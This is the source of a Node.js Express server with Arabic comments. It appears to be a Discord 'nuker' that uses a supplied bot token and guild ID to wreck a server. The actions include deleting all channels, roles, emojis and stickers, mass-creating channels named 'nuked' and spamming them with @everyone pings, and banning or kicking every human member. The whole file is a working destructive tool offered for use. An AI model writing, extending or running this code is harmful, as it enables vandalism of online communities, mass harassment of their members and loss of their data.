const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// دالة مساعدة للتحقق من صحة التوكن وجلب معلومات البوت
async function verifyToken(token) {
    try {
        const response = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bot ${token}` }
        });
        return { valid: true, bot: response.data };
    } catch (error) {
        const status = error.response?.status;
        let message = '';
        if (status === 401) message = '❌ توكن غير صالح (Unauthorized)';
        else if (status === 403) message = '❌ البوت محظور أو ليس لديه صلاحيات';
        else message = error.response?.data?.message || error.message;
        return { valid: false, error: message };
    }
}

// نقطة اختبار الاتصال بالخادم
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running' });
});

// نقطة التحقق من التوكن فقط
app.post('/api/verify', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(400).json({ error: 'No token provided' });
    const result = await verifyToken(token);
    if (result.valid) {
        res.json({ success: true, bot: result.bot });
    } else {
        res.status(401).json({ error: result.error });
    }
});

// نقطة تنفيذ الأوامر
app.post('/api/action', async (req, res) => {
    const { token, guildId, action, params } = req.body;
    if (!token || !guildId || !action) {
        return res.status(400).json({ error: 'Missing token, guildId, or action' });
    }

    // أولاً نتحقق من صحة التوكن
    const tokenCheck = await verifyToken(token);
    if (!tokenCheck.valid) {
        return res.status(401).json({ error: tokenCheck.error });
    }

    const headers = {
        Authorization: `Bot ${token}`,
        'Content-Type': 'application/json'
    };
    const baseURL = `https://discord.com/api/v10/guilds/${guildId}`;

    try {
        let responseData = { success: true, message: '' };

        switch (action) {
            case 'deleteChannels': {
                const channels = await axios.get(`${baseURL}/channels`, { headers });
                let deleted = 0;
                for (const channel of channels.data) {
                    if ([0, 2, 5].includes(channel.type)) {
                        await axios.delete(`${baseURL}/channels/${channel.id}`, { headers });
                        deleted++;
                    }
                }
                responseData.message = `Deleted ${deleted} channels`;
                break;
            }
            case 'createChannels': {
                const { name: channelName, count: channelCount = 20 } = params;
                for (let i = 0; i < channelCount; i++) {
                    await axios.post(`${baseURL}/channels`, {
                        name: `${channelName || 'nuked-channel'}-${i+1}`,
                        type: 0
                    }, { headers });
                }
                responseData.message = `Created ${channelCount} text channels`;
                break;
            }
            case 'createChannelsPing': {
                const { name: pingName, count: pingCount = 20 } = params;
                for (let i = 0; i < pingCount; i++) {
                    const newChannel = await axios.post(`${baseURL}/channels`, {
                        name: `${pingName || 'ping-channel'}-${i+1}`,
                        type: 0
                    }, { headers });
                    await axios.post(`${baseURL}/channels/${newChannel.data.id}/messages`, {
                        content: '@everyone **NUKED**'
                    }, { headers });
                }
                responseData.message = `Created ${pingCount} channels with @everyone ping`;
                break;
            }
            case 'deleteRoles': {
                const roles = await axios.get(`${baseURL}/roles`, { headers });
                let deleted = 0;
                for (const role of roles.data) {
                    if (role.name !== '@everyone') {
                        await axios.delete(`${baseURL}/roles/${role.id}`, { headers });
                        deleted++;
                    }
                }
                responseData.message = `Deleted ${deleted} roles`;
                break;
            }
            case 'createRoles': {
                const { roleName, roleCount = 20 } = params;
                for (let i = 0; i < roleCount; i++) {
                    await axios.post(`${baseURL}/roles`, {
                        name: `${roleName || 'nuked-role'}-${i+1}`
                    }, { headers });
                }
                responseData.message = `Created ${roleCount} roles`;
                break;
            }
            case 'deleteEmojis': {
                const emojis = await axios.get(`${baseURL}/emojis`, { headers });
                for (const emoji of emojis.data) {
                    await axios.delete(`${baseURL}/emojis/${emoji.id}`, { headers });
                }
                responseData.message = `Deleted ${emojis.data.length} emojis`;
                break;
            }
            case 'deleteStickers': {
                const stickers = await axios.get(`${baseURL}/stickers`, { headers });
                for (const sticker of stickers.data) {
                    await axios.delete(`${baseURL}/stickers/${sticker.id}`, { headers });
                }
                responseData.message = `Deleted ${stickers.data.length} stickers`;
                break;
            }
            case 'banAll': {
                const members = await axios.get(`${baseURL}/members?limit=1000`, { headers });
                let banned = 0;
                for (const member of members.data) {
                    if (!member.user.bot) {
                        await axios.put(`${baseURL}/bans/${member.user.id}`, {}, { headers });
                        banned++;
                    }
                }
                responseData.message = `Banned ${banned} members`;
                break;
            }
            case 'kickAll': {
                const membersKick = await axios.get(`${baseURL}/members?limit=1000`, { headers });
                let kicked = 0;
                for (const member of membersKick.data) {
                    if (!member.user.bot) {
                        await axios.delete(`${baseURL}/members/${member.user.id}`, { headers });
                        kicked++;
                    }
                }
                responseData.message = `Kicked ${kicked} members`;
                break;
            }
            default:
                return res.status(400).json({ error: 'Invalid action' });
        }

        res.json(responseData);
    } catch (error) {
        console.error('API Error:', error.response?.data || error.message);
        const errorMsg = error.response?.data?.message || error.message;
        res.status(500).json({ error: `Discord API error: ${errorMsg}` });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
    console.log(`👉 Open your browser and go to http://localhost:${PORT}`);
});
